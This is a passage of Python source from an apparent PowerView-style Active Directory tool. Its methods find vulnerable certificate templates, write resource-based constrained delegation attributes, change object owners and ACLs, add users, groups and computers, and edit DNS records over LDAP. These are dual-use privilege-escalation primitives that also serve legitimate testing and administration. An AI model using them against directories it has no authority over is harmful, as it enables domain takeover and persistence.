		username = self.whoami.split('\\')[1] if "\\" in self.whoami else self.whoami
		current_user = self.get_domainobject(
			ldap_filter=f"(sAMAccountName={username})",
			properties=['objectSid']
		)
		if len(current_user) == 0:
			logging.error(f"[Get-DomainCATemplate] Current user {username} not found")
			return
		elif len(current_user) > 1:
			logging.error(f"[Get-DomainCATemplate] More than one current user {username} found")
			return
		current_user_sid = current_user[0].get("attributes", {}).get("objectSid")
		
		if not current_user_sid:
			logging.error(f"[Get-DomainCATemplate] Current user {username} has no objectSid")
			return

		oids = ca_fetch.get_issuance_policies(no_cache=no_cache, no_vuln_check=no_vuln_check, raw=raw)
		for ca in cas:
			object_id = ca.get("attributes").get("objectGUID").lstrip("{").rstrip("}")
			ca.get("attributes").update({"object_id": object_id})
			ca_templates = ca.get("attributes").get("certificateTemplates")
			if ca_templates is None:
				ca_templates = []

			for template in templates:
				vulnerable = False
				vulns = {}
				list_vuln = []

				# avoid dupes
				if template.get("attributes").get("objectGUID") in template_guids:
					continue
				else:
					template_guids.append(template.get("attributes").get("objectGUID"))

				# Oid
				object_id = template.get("attributes").get("objectGUID").lstrip("{").rstrip("}")
				issuance_policies = template.get("attributes").get("msPKI-Certificate-Policy")

				if not isinstance(issuance_policies, list):
					if issuance_policies is None:
						issuance_policies = []
					else:
						issuance_policies = [issuance_policies]

				linked_group = None
				for oid in oids:
					if oid.get("attributes").get("msPKI-Cert-Template-OID") in issuance_policies:
						linked_group = oid.get("attributes").get("msDS-OIDToGroupLink")


				template_ops = PARSE_TEMPLATE(template.get("attributes"), current_user_sid=current_user_sid, linked_group=linked_group, ldap_session=self.ldap_session)
				parsed_dacl = template_ops.parse_dacl()
				template_ops.resolve_flags()
				template_owner = template_ops.get_owner_sid()
				certificate_name_flag = template_ops.get_certificate_name_flag()
				enrollment_flag = template_ops.get_enrollment_flag()
				extended_key_usage = template_ops.get_extended_key_usage()
				validity_period = template_ops.get_validity_period()
				renewal_period = template_ops.get_renewal_period()
				requires_manager_approval = template_ops.get_requires_manager_approval()

				vulns = template_ops.check_vulnerable_template()

				if resolve_sids:
					template_owner = self.convertfrom_sid(template_ops.get_owner_sid())

					for i in range(len(parsed_dacl['Extended Rights'])):
						try:
							parsed_dacl['Extended Rights'][i] = self.convertfrom_sid(parsed_dacl['Extended Rights'][i])
						except:
							pass

					for i in range(len(parsed_dacl['Enrollment Rights'])):
						try:
							parsed_dacl['Enrollment Rights'][i] = self.convertfrom_sid(parsed_dacl['Enrollment Rights'][i])
						except:
							pass

					for k in range(len(parsed_dacl['Write Owner'])):
						try:
							parsed_dacl['Write Owner'][k] = self.convertfrom_sid(parsed_dacl['Write Owner'][k])
						except:
							pass

					for j in range(len(parsed_dacl['Write Dacl'])):
						try:
							parsed_dacl['Write Dacl'][j] = self.convertfrom_sid(parsed_dacl['Write Dacl'][j])
						except:
							pass

					for y in range(len(parsed_dacl['Write Property'])):
						try:
							parsed_dacl['Write Property'][y] = self.convertfrom_sid(parsed_dacl['Write Property'][y])
						except:
							pass

					for y in vulns.keys():
						try:
							list_vuln.append(y+" - "+list_sids(vulns[y]))
						except:
							list_vuln.append(vulns[y])

				# Resolve Vulnerable (Without resolvesids)
				if not resolve_sids:
					for y in vulns.keys():
						try:
							list_vuln.append(y+" - "+vulns[y])
						except:
							list_vuln.append(vulns[y])

				e = modify_entry(template,
								 new_attributes={
									'Owner': template_owner,
									'Certificate Authorities': ca.get('attributes').get('name'),
									'msPKI-Certificate-Name-Flag': certificate_name_flag,
									'msPKI-Enrollment-Flag': enrollment_flag,
									'pKIExtendedKeyUsage': extended_key_usage,
									'pKIExpirationPeriod': validity_period,
									'pKIOverlapPeriod': renewal_period,
									'ManagerApproval': requires_manager_approval,
									'Enrollment Rights': parsed_dacl['Enrollment Rights'],
									'Extended Rights': parsed_dacl['Extended Rights'],
									'Client Authentication': template_ops.get_client_authentication(),
									'Enrollment Agent': template_ops.get_enrollment_agent(),
									'Any Purpose': template_ops.get_any_purpose(),
									**({"Linked Groups": linked_group} if linked_group is not None else {}),
									'Write Owner': parsed_dacl['Write Owner'],
									'Write Dacl': parsed_dacl['Write Dacl'],
									'Write Property': parsed_dacl['Write Property'],
									'Enabled': False,
									'Vulnerable': list_vuln
								},
								 remove = [
									 'nTSecurityDescriptor',
									 'msPKI-Certificate-Name-Flag',
									 'msPKI-Enrollment-Flag',
									 'pKIExpirationPeriod',
									 'pKIOverlapPeriod',
									 'pKIExtendedKeyUsage'
								 ]
								 )
				new_dict = e["attributes"]
				list_entries.append(new_dict)

		for ent in list_entries:
			enabled = False
			if ent.get("cn") in ca_templates:
				enabled = True
				ent.update({"Enabled": enabled})

			if args_enabled and not enabled:
				continue

			vulnerable = False
			if ent.get("Vulnerable"):
				vulnerable = True

			if args_vulnerable and not vulnerable:
				continue

			if properties:
				ent = filter_entry(ent,properties)

			entries.append({
				"attributes": ent
			})

		template_guids.clear()
		return entries

	def set_domainrbcd(self, identity, delegatefrom, searchbase=None, args=None, raw=True):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		# verify that the identity exists
		_identity = self.get_domainobject(identity=identity,
					properties = [
						"sAMAccountName",
						"objectSid",
						"distinguishedName",
						"msDS-AllowedToActOnBehalfOfOtherIdentity"
					],
					searchbase=searchbase,
					sd_flag=0x01,
					raw=raw
					)

		if len(_identity) > 1:
			logging.error("[Set-DomainRBCD] More then one identity found")
			return
		elif len(_identity) == 0:
			logging.error(f"[Set-DomainRBCD] {identity} identity not found in domain")
			return
		
		logging.debug(f"[Set-DomainRBCD] {identity} identity found")
		targetidentity = _identity[0]

		# verify that delegate identity exists
		delegfrom_identity = self.get_domainobject(identity=delegatefrom, properties = [
				"sAMAccountName",
				"objectSid",
				"distinguishedName",
			],
			searchbase=searchbase
		)

		if len(delegfrom_identity) > 1:
			logging.error("[Set-DomainRBCD] More then one identity found")
			return False
		elif len(delegfrom_identity) == 0:
			logging.error(f"[Set-DomainRBCD] {delegatefrom} identity not found in domain")
			return False
		logging.debug(f"[Set-DomainRBCD] {delegatefrom} identity found")

		# now time to modify
		delegfrom_identity = delegfrom_identity[0]
		delegfrom_sid = delegfrom_identity.get("attributes").get("objectSid")

		if delegfrom_sid is None:
			return False

		rbcd = RBCD(targetidentity, self.ldap_session)
		succeed = rbcd.write_to(delegfrom_sid)
		if succeed:
			logging.info(f"[Set-DomainRBCD] Success! {delegatefrom} is now in {identity}'s msDS-AllowedToActOnBehalfOfOtherIdentity attribute")
		else:
			logging.error("[Set-DomainRBCD] Failed to write to {delegatefrom} object")
			return False

		return True

	def set_domainobjectowner(self, targetidentity, principalidentity, searchbase=None, args=None):
		"""
		Change the owner of a domain object to a new principal identity in the LDAP directory.

		Parameters:
			targetidentity: Identity of the object whose ownership is to be changed.
			principalidentity: Identity of the new owner.
			searchbase: Optional. The search base for looking up the target identity.
			args: Additional arguments, mainly used to determine the search base if not provided.

		Returns:
		bool: True if successful, False otherwise.
		"""
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		# verify that the targetidentity exists
		target_identity = self.get_domainobject(identity=targetidentity, properties=[
			'nTSecurityDescriptor',
			'sAMAccountname',
			'ObjectSID',
			'distinguishedName',
			],
			searchbase=searchbase,
			sd_flag=0x01,
		)
		if len(target_identity) > 1:
			logging.error("[Set-DomainObjectOwner] More than one target identity found")
			return False
		elif len(target_identity) == 0:
			logging.error(f"[Set-DomainObjectOwner] {targetidentity} identity not found in domain")
			return False
		logging.debug(f"[Set-DomainObjectOwner] {targetidentity} identity found")

		# verify that the principalidentity exists
		principal_identity = self.get_domainobject(identity=principalidentity)
		if len(principal_identity) > 1:
			logging.error("[Set-DomainObjectOwner] More than one principal identity found")
			return False
		elif len(principal_identity) == 0:
			logging.error(f"[Set-DomainObjectOwner] {principalidentity} identity not found in domain")
			return False
		logging.debug(f"[Set-DomainObjectOwner] {principalidentity} identity found")

		# create changeowner object
		chown = ObjectOwner(target_identity[0])
		target_identity_owner = chown.read()

		if target_identity_owner == principal_identity[0]["attributes"]["objectSid"]:
			logging.warning("[Set-DomainObjectOwner] %s is already the owner of the %s" % (principal_identity[0]["attributes"]["sAMAccountName"], target_identity[0]["attributes"]["distinguishedName"]))
			return False

		logging.info("[Set-DomainObjectOwner] Changing current owner %s to %s" % (target_identity_owner, principal_identity[0]["attributes"]["objectSid"]))

		new_secdesc = chown.modify_securitydescriptor(principal_identity[0])

		succeeded = self.ldap_session.modify(
			target_identity[0]["attributes"]["distinguishedName"],
			{'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [
				new_secdesc.getData()
			])},
			controls=security_descriptor_control(sdflags=0x01)
		)

		if not succeeded:
			logging.error(f"[Set-DomainObjectOwner] Error modifying object owner ({self.ldap_session.result['description']})")
			return False
		else:
			logging.info(f'[Set-DomainObjectOwner] Success! modified owner for {target_identity[0]["attributes"]["distinguishedName"]}')

		return succeeded

	def set_domaincatemplate(self, identity, args=None):
		if not args or not identity:
			logging.error("[Set-DomainCATemplate] No identity or args supplied")
			return

		ca_fetch = CAEnum(self)
		target_template = ca_fetch.get_certificate_templates(identity=identity, properties=['*'])
		if len(target_template) == 0:
			logging.error("[Set-DomainCATemplate] No template found")
			return False
		elif len(target_template) > 1:
			logging.error('[Set-DomainCATemplate] More than one template found')
			return False
		logging.info(f'[Set-DomainCATempalte] Found template dn {target_template[0].get("dn")}')

		attr_key = ""
		attr_val = []

		if args.clear:
			attr_key = args.clear
		else:
			attrs = ini_to_dict(args.set) if args.set else ini_to_dict(args.append)

			if not attrs:
				logging.error(f"Parsing {'-Set' if args.set else '-Append'} value failed")
				return

			try:
				for val in attrs['value']:
					try:
						if val in target_template[0][attrs['attribute']]:
							logging.error(f"[Set-DomainCATemplate] Value {val} already set in the attribute "+attrs['attribute'])
							return
					except KeyError as e:
						logging.debug("[Set-DomainCATemplate] Attribute %s not found in template" % attrs['attribute'])
			except ldap3.core.exceptions.LDAPKeyError as e:
				logging.error(f"[Set-DomainCATemplate] Key {attrs['attribute']} not found in template attribute. Adding anyway...")

			if args.append:
				temp_list = []
				if isinstance(target_template[0][attrs['attribute']].value, str):
					temp_list.append(target_template[0][attrs['attribute']].value)
				elif isinstance(target_template[0][attrs['attribute']].value, int):
					temp_list.append(target_template[0][attrs['attribute']].value)
				elif isinstance(target_template[0][attrs['attribute']].value, list):
					temp_list = target_template[0][attrs['attribute']].value
				attrs['value'] = list(set(attrs['value'] + temp_list))
			elif args.set:
				attrs['value'] = list(set(attrs['value']))

			attr_key = attrs['attribute']
			attr_val = attrs['value']

		try:
			succeeded = self.ldap_session.modify(target_template[0].get("dn"), {
				attr_key:[
					(ldap3.MODIFY_REPLACE,attr_val)
				]
			})
		except ldap3.core.exceptions.LDAPInvalidValueError as e:
			logging.error(f"[Set-DomainCATemplate] {str(e)}")
			succeeded = False

		if not succeeded:
			logging.error(self.ldap_session.result if self.args.debug else "[Set-DomainCATemplate] Failed to modify template")
		else:
			logging.info(f'[Set-DomainCATemplate] Success! modified attribute for {identity} template')

		return succeeded

	def add_domaingroupmember(self, identity, members, args=None):
		if not is_dn(identity):
			group_entry = self.get_domaingroup(identity=identity, properties=['distinguishedName'])
			if len(group_entry) == 0:
				logging.error(f'[Add-DomainGroupMember] Group {identity} not found in domain')
				return False
			elif len(group_entry) > 1:
				logging.error(f'[Add-DomainGroupMember] More than one group found for {identity}')
				return False
			targetobject_dn = group_entry[0]["attributes"]["distinguishedName"]
		else:
			targetobject_dn = identity
		
		target_domain = None
		username = members
		
		if is_dn(members):
			userobject_dn = members
		else:
			if '@' in members:
				username, target_domain = members.split('@', 1)
				logging.debug(f"[Add-DomainGroupMember] Detected username@domain format: {username}@{target_domain}")
			elif '\\' in members:
				domain_part, username = members.split('\\', 1)
				target_domain = domain_part
				logging.debug(f"[Add-DomainGroupMember] Detected domain\\username format: {target_domain}\\{username}")
			
			if target_domain and target_domain.lower() != self.domain.lower():
				logging.debug(f"[Add-DomainGroupMember] Searching for {username} in domain {target_domain}")
				try:
					result = self.execute_in_domain(
						target_domain, 
						self.get_domainobject,
						identity=username,
						properties=['distinguishedName']
					)
					
					if not result or len(result) == 0:
						logging.error(f'[Add-DomainGroupMember] User {username} not found in domain {target_domain}')
						return False
					elif len(result) > 1:
						logging.error(f'[Add-DomainGroupMember] More than one user found for {username} in domain {target_domain}')
						return False
					
					userobject_dn = result[0]["attributes"]["distinguishedName"]
					logging.debug(f"[Add-DomainGroupMember] Found user DN in domain {target_domain}: {userobject_dn}")
				except Exception as e:
					logging.error(f'[Add-DomainGroupMember] Error resolving user in domain {target_domain}: {str(e)}')
					return False
			else:
				user_entry = self.get_domainobject(identity=username, properties=['distinguishedName'])
				
				if len(user_entry) == 0:
					logging.error(f'[Add-DomainGroupMember] User {username} not found in domain. Try to use DN')
					return False
				elif len(user_entry) > 1:
					logging.error(f'[Add-DomainGroupMember] More than one user found for {username}')
					return False
				
				userobject_dn = user_entry[0]["attributes"]["distinguishedName"]
		
		if isinstance(targetobject_dn, list):
			targetobject_dn = targetobject_dn[0]
		
		if isinstance(userobject_dn, list):
			userobject_dn = userobject_dn[0]
		
		try:
			succeeded = self.ldap_session.modify(targetobject_dn, {'member': [(ldap3.MODIFY_ADD, [userobject_dn])]})
		except ldap3.core.exceptions.LDAPInvalidValueError as e:
			logging.error(f"[Add-DomainGroupMember] {str(e)}")
			succeeded = False
		except ldap3.core.exceptions.LDAPNoSuchObjectResult as e:
			if self.args.stack_trace:
				raise e
			logging.error(f"[Add-DomainGroupMember] LDAPNoSuchObjectResult: Object does not exist")
			if not is_dn(identity):
				logging.warning("[Add-DomainGroupMember] Use a DN for the identity instead")
			if not is_dn(members):
				logging.warning("[Add-DomainGroupMember] Use a DN for the members instead")
			succeeded = False
		except Exception as e:
			logging.error(f"[Add-DomainGroupMember] Unexpected error: {str(e)}")
			succeeded = False
		
		if succeeded:
			logging.info(f"[Add-DomainGroupMember] Successfully added {members} to group {identity}")
		
		return succeeded

	def disable_domaindnsrecord(self, recordname, zonename=None):
		import struct
		from datetime import datetime, timezone
		
		utc_now = datetime.now(timezone.utc)
		ticks_1601 = datetime(1601, 1, 1, tzinfo=timezone.utc).timestamp() * 10000000
		ticks_now = utc_now.timestamp() * 10000000
		timestamp = int(ticks_now - ticks_1601)
		
		timestamp_bytes = struct.pack('<Q', timestamp)
		
		soa_serial_array = [0x00, 0x00, 0x00, 0x01]
		
		dns_record = bytes([0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00]) + \
					bytes(soa_serial_array) + \
					bytes([0x00] * 12) + \
					timestamp_bytes

		# succeed = self.set_domaindnsrecord(
		# 	recordname=recordname,
		# 	recordaddress="0.0.0.0",
		# 	zonename=zonename,
		# )
		entry = self.get_domaindnsrecord(identity=recordname, zonename=zonename)
		if len(entry) == 0:
			logging.error("[Disable-DomainDNSRecord] No record found")
			return
		elif len(entry) > 1:
			logging.error("[Disable-DomainDNSRecord] More than one record found")
			return

		record_dn = entry[0]["attributes"]["distinguishedName"]
		record_name = entry[0]["attributes"]["name"]
		
		changed_dns_record = self.set_domainobject(
			identity=record_name,
			_set = {
				'attribute': 'dnsRecord',
				'value': dns_record
			},
			searchbase=record_dn
		)
		changed_dns_tombstone = self.set_domainobject(
			identity=record_name,
			_set = {
				'attribute': 'dnsTombstoned',
				'value': True
			},
			searchbase=record_dn
		)

		if changed_dns_record and changed_dns_tombstone:
			logging.info(f"[Disable-DomainDNSRecord] {recordname} dns record disabled")
			return True
		else:
			logging.error("[Disable-DomainDNSRecord] Failed to disable dns record")
			return False

	def remove_domaindnsrecord(self, recordname=None, zonename=None):
		if zonename:
			zonename = zonename.lower()
		else:
			zonename = self.domain.lower()
			logging.debug("[Remove-DomainDNSRecord] Using current domain %s as zone name" % zonename)

		zones = [name['attributes']['name'].lower() for name in self.get_domaindnszone(properties=['name'])]
		if zonename not in zones:
			logging.info("[Remove-DomainDNSRecord] Zone %s not found" % zonename)
			return

		entry = self.get_domaindnsrecord(identity=recordname, zonename=zonename)

		if len(entry) == 0:
			logging.info("[Remove-DomainDNSRecord] No record found")
			return
		elif len(entry) > 1:
			logging.error("[Remove-DomainDNSRecord] More than one record found")
			return

		record_dn = entry[0]["attributes"]["distinguishedName"]

		succeeded = self.ldap_session.delete(record_dn)
		if not succeeded:
			logging.error(self.ldap_session.result['message'] if self.args.debug else "[Remove-DomainDNSRecord] Failed to delete record")
			return False
		else:
			logging.info("[Remove-DomainDNSRecord] Success! Deleted the record")
			return True

	def remove_domaingroupmember(self, identity, members, args=None):
		group_entry = self.get_domaingroup(identity=identity,properties=['distinguishedName'])
		user_entry = self.get_domainobject(identity=members,properties=['distinguishedName'])
		if len(group_entry) == 0:
			logging.error(f'[Remove-DomainGroupmember] Group {identity} not found in domain')
			return
		if len(user_entry) == 0:
			logging.error(f'[Remove-DomainGroupMember] User {members} not found in domain, Try to use DN')
			return
		targetobject = group_entry[0]
		userobject = user_entry[0]
		if isinstance(targetobject["attributes"]["distinguishedName"], list):
			targetobject_dn = targetobject["attributes"]["distinguishedName"][0]
		else:
			targetobject_dn = targetobject["attributes"]["distinguishedName"]

		if isinstance(userobject["attributes"]["distinguishedName"], list):
			userobject_dn = userobject["attributes"]["distinguishedName"][0]
		else:
			userobject_dn = userobject["attributes"]["distinguishedName"]
		succeeded = self.ldap_session.modify(targetobject_dn,{'member': [(ldap3.MODIFY_DELETE, [userobject_dn])]})
		if not succeeded:
			print(self.ldap_session.result['message'])
		return succeeded

	def remove_domainuser(self, identity):
		if not identity:
			logging.error('[Remove-DomainUser] Identity is required')
			return

		entries = self.get_domainuser(identity=identity)
		if len(entries) == 0:
			logging.error('[Remove-DomainUser] Identity not found in domain')
			return
		identity_dn = entries[0]["attributes"]["distinguishedName"]
		au = ADUser(self.ldap_session, self.root_dn)
		return au.removeUser(identity_dn)

	def add_domaingroup(self, groupname, basedn=None, args=None):
		parent_dn_entries = f"CN=Users,{self.root_dn}"
		if basedn:
			parent_dn_entries = basedn
		if hasattr(args, 'basedn') and args.basedn:
			parent_dn_entries = args.basedn

		entries = self.get_domainobject(identity=parent_dn_entries)
		if len(entries) <= 0:
			logging.error(f"[Add-DomainGroup] {parent_dn_entries} could not be found in the domain")
			return
		elif len(entries) > 1:
			logging.error("[Add-DomainGroup] More than one group found in domain")
			return

		parent_dn_entries = entries[0]["attributes"]["distinguishedName"]
		logging.debug(f"[Add-DomainGroup] Adding group in {parent_dn_entries}")

		group_dn = f"CN={groupname},{parent_dn_entries}"
		ucd = {
			'displayName': groupname,
			'sAMAccountName': groupname,
			'objectCategory': f'CN=Group,{self.schema_dn}',
			'objectClass': ['top', 'group'],
		}

		succeed = self.ldap_session.add(group_dn, ['top', 'group'], ucd)
		if not succeed:
			logging.error(f"[Add-DomainGroup] Failed adding {groupname} to domain ({self.ldap_session.result['description']})")
			return False
		else:
			logging.info('[Add-DomainGroup] Success! Created new group')
			return True

	def add_domainuser(self, username, userpass, basedn=None, args=None):
		parent_dn_entries = f"CN=Users,{self.root_dn}"
		if basedn:
			parent_dn_entries = basedn
		if hasattr(args, 'basedn') and args.basedn:
			parent_dn_entries = args.basedn

		entries = self.get_domainobject(identity=parent_dn_entries, properties=['distinguishedName'])
		if len(entries) <= 0:
			logging.error(f"[Add-DomainUser] {parent_dn_entries} could not be found in the domain")
			return
		elif len(entries) > 1:
			logging.error("[Add-DomainUser] More than one group found in domain")
			return

		parent_dn_entries = entries[0]["attributes"]["distinguishedName"]

		logging.debug(f"[Add-DomainUser] Adding user in {parent_dn_entries}")
		
		if self.conn.use_ldaps:
			logging.debug("[Add-DomainUser] Adding user through %s" % self.conn.proto)
			au = ADUser(self.ldap_session, self.root_dn, parent = parent_dn_entries)
			succeed = au.addUser(username, userpass)
		else:
			logging.debug("[Add-DomainUser] Adding user through %s" % self.conn.proto)
			udn = "CN=%s,%s" % (
						username,
						parent_dn_entries
					)
			ucd = {
				'displayName': username,
				'sAMAccountName': username,
				'userPrincipalName': f"{username}@{self.domain}",
				'name': username,
				'givenName': username,
				'sn': username,
				'userAccountControl': ['66080'],
			}
			object_class = ['user']
			if not self.conn.use_adws:
				object_class.extend(['top', 'person', 'organizationalPerson'])
			succeed = self.ldap_session.add(udn, object_class, ucd)
			
		if not succeed:
			logging.error(self.ldap_session.result['message'] if self.args.debug else f"[Add-DomainUser] Failed adding {username} to domain ({self.ldap_session.result['description']})")
			return False
		else:
			logging.info('[Add-DomainUser] Success! Created new user')

			if not self.conn.use_ldaps:
				logging.info("[Add-DomainUser] Setting password via LDAP modify operation")
				password_set = self.set_domainuserpassword(udn, userpass)
				if not password_set:
					logging.error("[Add-DomainUser] Password setting failed, removing created user to prevent security hole")
					self.remove_domainuser(udn)
					return False
			
			return True

	def remove_domainobjectacl(self, targetidentity, principalidentity, rights="fullcontrol", rights_guid=None, ace_type="allowed", inheritance=False):
		# verify if target identity exists
		target_entries = self.get_domainobject(identity=targetidentity, properties=['objectSid', 'distinguishedName', 'sAMAccountName','nTSecurityDescriptor'], sd_flag=0x04)
		
		target_dn = None
		target_sAMAccountName = None
		target_SID = None
		target_security_descriptor = None
		
		if len(target_entries) == 0:
			logging.error('[Remove-DomainObjectACL] Target Identity object not found in domain')
			return
		elif len(target_entries) > 1:
			logging.error("[Remove-DomainObjectACL] More then one target identity found")
			return

		target_dn = target_entries[0].get("dn") #target_DN
		target_sAMAccountName = target_entries[0].get("attributes").get("sAMAccountName") #target_sAMAccountName
		target_SID = target_entries[0].get("attributes").get("objectSid") #target_SID
		target_security_descriptor = target_entries[0].get("raw_attributes").get("nTSecurityDescriptor")[0]

		logging.info(f'[Remove-DomainObjectACL] Found target identity: {target_dn if target_dn else target_sAMAccountName}')
		
		# verify if principalidentity exists
		principal_entries = self.get_domainobject(identity=principalidentity, properties=['objectSid', 'distinguishedName', 'sAMAccountName'])
		
		principal_dn = None
		principal_sAMAccountName = None
		principal_SID = None

		if len(principal_entries) == 0:
			logging.debug('[Remove-DomainObjectAcl] Principal not found. Searching in Well Known SIDs...')
			well_known_obj = resolve_WellKnownSID(principalidentity)
			principal_sAMAccountName = well_known_obj.get("sAMAccountName")
			principal_SID = well_known_obj.get("objectSid")
			if principal_SID:
				logging.debug("[Remove-DomainObjectAcl] Found in well known SID: %s" % principal_SID)
			else:
				logging.error('[Remove-DomainObjectACL] Principal Identity object not found in domain')
				return
		elif len(principal_entries) > 1:
			logging.error("[Remove-DomainObjectACL] More then one principal identity found")
			return

		principal_dn = principal_entries[0].get("dn") if principal_entries else principal_dn #principal_DN
		principal_sAMAccountName = principal_entries[0].get("attributes").get("sAMAccountName") if principal_entries else principal_sAMAccountName #principal_sAMAccountName
		principal_SID = principal_entries[0].get("attributes").get("objectSid") if principal_entries else principal_SID #principal_SID

		logging.info(f'[Remove-DomainObjectACL] Found principal identity: {principal_dn if principal_dn else principal_sAMAccountName}')
		
		dacledit = DACLedit(
				self.ldap_server,
				self.ldap_session,
				self.root_dn,
				target_sAMAccountName,
				target_SID,
				target_dn,
				target_security_descriptor,
				principal_sAMAccountName,
				principal_SID,
				principal_dn,
				ace_type,
				rights,
				rights_guid,
				inheritance
			)
		dacledit.remove()

	def add_domainobjectacl(self, targetidentity, principalidentity, rights="fullcontrol", rights_guid=None, ace_type="allowed", inheritance=False):
		# verify if target identity exists
		target_entries = self.get_domainobject(identity=targetidentity, properties=['objectSid', 'distinguishedName', 'sAMAccountName','nTSecurityDescriptor'], sd_flag=0x04)
		
		target_dn = None
		target_sAMAccountName = None
		target_SID = None
		
		if len(target_entries) == 0:
			logging.error('[Add-DomainObjectACL] Target Identity object not found in domain')
			return
		elif len(target_entries) > 1:
			logging.error("[Add-DomainObjectACL] More then one target identity found")
			return

		target_dn = target_entries[0].get("dn") #target_DN
		target_sAMAccountName = target_entries[0].get("attributes").get("sAMAccountName") #target_sAMAccountName
		target_SID = target_entries[0].get("attributes").get("objectSid") #target_SID
		target_security_descriptor = target_entries[0].get("raw_attributes").get("nTSecurityDescriptor")[0]

		logging.info(f'[Add-DomainObjectACL] Found target identity: {target_dn if target_dn else target_sAMAccountName}')
		
		# verify if principalidentity exists
		principal_entries = self.get_domainobject(identity=principalidentity, properties=['objectSid', 'distinguishedName', 'sAMAccountName'])
		
		principal_dn = None
		principal_sAMAccountName = None
		principal_SID = None

		if len(principal_entries) == 0:
			logging.debug('[Add-DomainObjectAcl] Principal not found. Searching in Well Known SIDs...')
			well_known_obj = resolve_WellKnownSID(principalidentity)
			principal_sAMAccountName = well_known_obj.get("sAMAccountName")
			principal_SID = well_known_obj.get("objectSid")
			if principal_SID:
				logging.debug("[Add-DomainObjectAcl] Found in well known SID: %s" % principal_SID)
			else:
				logging.error('[Add-DomainObjectACL] Principal Identity object not found in domain')
				return
		elif len(principal_entries) > 1:
			logging.error("[Add-DomainObjectACL] More then one principal identity found")
			return

		principal_dn = principal_entries[0].get("dn") if principal_entries else principal_dn #principal_DN
		principal_sAMAccountName = principal_entries[0].get("attributes").get("sAMAccountName") if principal_entries else principal_sAMAccountName #principal_sAMAccountName
		principal_SID = principal_entries[0].get("attributes").get("objectSid") if principal_entries else principal_SID #principal_SID

		logging.info(f'[Add-DomainObjectACL] Found principal identity: {principal_dn if principal_dn else principal_sAMAccountName}')
		
		dacledit = DACLedit(
				self.ldap_server,
				self.ldap_session,
				self.root_dn,
				target_sAMAccountName,
				target_SID,
				target_dn,
				target_security_descriptor,
				principal_sAMAccountName,
				principal_SID,
				principal_dn,
				ace_type,
				rights,
				rights_guid,
				inheritance
			)
		success = dacledit.write()
		if success:
			logging.info(f'[Add-DomainObjectACL] Success! Added ACL to {target_dn if target_dn else target_sAMAccountName}')
			return True
		else:
			logging.error(f'[Add-DomainObjectACL] Failed to add ACL to {target_dn if target_dn else target_sAMAccountName}')
			return False

	def remove_domaincomputer(self, computer_name, args=None):
		parent_dn_entries = self.root_dn
		if hasattr(args, 'basedn') and args.basedn:
			entries = self.get_domainobject(identity=args.basedn)
			if len(entries) <= 0:
				logging.error(f"[Add-DomainComputer] {args.basedn} could not be found in the domain")
				return
			elif len(entries) > 1:
				logging.error("[Add-DomainComputer] More then one computer found in domain")
				return

			parent_dn_entries = entries[0]["attributes"]["distinguishedName"]
		
		setattr(self.args, "TGT", self.conn.get_TGT())
		setattr(self.args, "TGS", self.conn.get_TGS())
		setattr(self.args, "dc_host", self.dc_dnshostname)
		setattr(self.args, "delete", True)

		if self.ssl:
			setattr(self.args, "method", "LDAPS")
		else:
			setattr(self.args, "method", "SAMR")

		# Creating Machine Account
		addmachineaccount = ADDCOMPUTER(
				username = self.username,
				password = self.password,
				domain = self.domain,
				cmdLineOptions = self.args,
				computer_name = computer_name,
				base_dn = parent_dn_entries,
				ldap_session = self.ldap_session
				)
		try:
			if self.ssl:
				addmachineaccount.run_ldaps()
			else:
				addmachineaccount.run_samr()
		except Exception as e:
			logging.error(str(e))
			return False

		if len(self.get_domainobject(identity=computer_name)) == 0:
			return True
		else:
			return False

	def set_domaindnsrecord(self, recordname, recordaddress, zonename=None, timeout=15):
		if zonename:
			zonename = zonename.lower()
		else:
			zonename = self.domain.lower()
			logging.debug("[Set-DomainDNSRecord] Using current domain %s as zone name" % zonename)

		entry = self.get_domaindnsrecord(identity=recordname, zonename=zonename, properties=['dnsRecord', 'distinguishedName', 'name'])

		if not entry:
			return
		elif len(entry) == 0:
			logging.info("[Set-DomainDNSRecord] No record found")
			return
		elif len(entry) > 1:
			logging.info("[Set-DomainDNSRecord] More than one record found")
			return

		if self.args.debug:
			logging.debug(f"[Set-DomainDNSRecord] Updating dns record {recordname} to {recordaddress}")

		targetrecord = None
		records = []
		for record in entry[0]["attributes"]["dnsRecord"]:
			dr = DNS_RECORD(record)
			if dr["Type"] == 1:
				targetrecord = dr
			else:
				records.append(record)

		if not targetrecord:
			logging.error("[Set-DomainDNSRecord] No A record exists yet. Nothing to modify")
			return

		targetrecord["Serial"] = DNS_UTIL.get_next_serial(self.nameserver, self.dc_ip, zonename, True, timeout)
		targetrecord['Data'] = DNS_RPC_RECORD_A()
		targetrecord['Data'].fromCanonical(recordaddress)
		records.append(targetrecord.getData())

		succeeded = self.ldap_session.modify(entry[0]['attributes']['distinguishedName'], {'dnsRecord': [(ldap3.MODIFY_REPLACE, records)]})

		if not succeeded:
			logging.error(self.ldap_session.result['message'])
			return False
		else:
			logging.info('[Set-DomainDNSRecord] Success! modified attribute for target record %s' % entry[0]['attributes']['distinguishedName'])
			return True

	def add_domaindnsrecord(self, recordname, recordaddress, zonename=None, timeout=15):
		if zonename:
			zonename = zonename.lower()
		else:
			zonename = self.domain.lower()
			logging.debug("[Add-DomainDNSRecord] Using current domain %s as zone name" % zonename)

		zones = [name['attributes']['name'].lower() for name in self.get_domaindnszone(properties=['name'])]
		if zonename not in zones:
			logging.info("[Add-DomainDNSRecord] Zone %s not found" % zonename)
			return

		if recordname.lower().endswith(zonename.lower()):
			recordname = recordname[:-(len(zonename)+1)]

		# addtype is A record = 1
		addtype = 1
		DNS_UTIL.get_next_serial(self.nameserver, self.dc_ip, zonename, True, timeout)
		node_data = {
				# Schema is in the root domain (take if from schemaNamingContext to be sure)
				'objectCategory': f'CN=Dns-Node,{self.schema_dn}',
				'dNSTombstoned': "FALSE", # Need to hardcoded because of Kerberos issue, will revisit.
				'name': recordname
				}
		logging.debug("[Add-DomainDNSRecord] Creating DNS record structure")
		record = DNS_UTIL.new_record(addtype, DNS_UTIL.get_next_serial(self.nameserver, self.dc_ip, zonename, True), recordaddress)
		search_base = f"DC={zonename},CN=MicrosoftDNS,DC=DomainDnsZones,{self.root_dn}"
